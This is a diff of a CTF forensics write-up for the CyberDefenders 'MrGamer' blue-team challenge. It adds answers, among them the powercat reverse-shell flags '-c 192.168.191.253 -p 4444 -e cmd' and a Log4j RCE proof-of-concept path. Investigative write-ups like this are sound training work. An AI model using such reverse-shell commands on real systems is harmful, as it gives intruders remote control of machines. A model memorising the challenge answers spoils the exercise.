@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/32b30870-4d06-45e9-8ec7-bd0835648031)![image](https://github.com/user-attachments/assets/3ce6cfdc-36af-4805-9262-d18f252dc1b0)![image](https://github.com/user-attachments/assets/55707645-1c62-468e-b549-75783c04adfb)![image](https://github.com/user-attachments/assets/5ec93d1a-8b9f-4389-90b5-1cb3b7101540)# <a href="https://cyberdefenders.org/blueteam-ctf-challenges/mrgamer/">MrGamer</a>
+# <a href="https://cyberdefenders.org/blueteam-ctf-challenges/mrgamer/">MrGamer</a>
 
 **Platform:** CyberDefenders
 
@@ -112,7 +112,8 @@ Babish Culinary Universe
 
 ![image](https://github.com/user-attachments/assets/7a38f7c0-a77f-475c-82d9-8aacd1e285cd)
 
-![image](https://github.com/user-attachments/assets/681ea8be-d396-4017-9f59-9af770187a91)
+![image](
+https://github.com/user-attachments/assets/681ea8be-d396-4017-9f59-9af770187a91)
 
 ***10. Hunt the Wumpus -> What is the module with the highest installed version for the chat application with the mascot Wumpus?***  
 
@@ -164,6 +165,16 @@ rickrolled
 
 ***14. The RCE is base(64)d on what? -> What were the three flags and their values that were passed to powercat? The answer must be provided in the same format as the entered command. (For example, if the command was "powercat -D Y -l a -n," the answer would be "-D Y -l a -n")***  
 Flags(e.g.,-c 192.**...) Flags(e.g.,-c 192.**...)  
+
+-c 192.168.191.253 -p 4444 -e cmd
+
+![image](https://github.com/user-attachments/assets/ac8d325c-5ae4-4e39-a10e-d0ccfa49ebdc)
+
+/home/rafael/marshalsec/.git/poc/Log4jRCE.java
+
+![image](https://github.com/user-attachments/assets/7c0b4e20-eda1-48ae-82ea-40f9a0c2b31f)
+
+cyberchef
 
 ***15. Hello (New) World -> How many dimensions (including the overworld) did the player travel to in the "oldest of the worlds"?***  
 
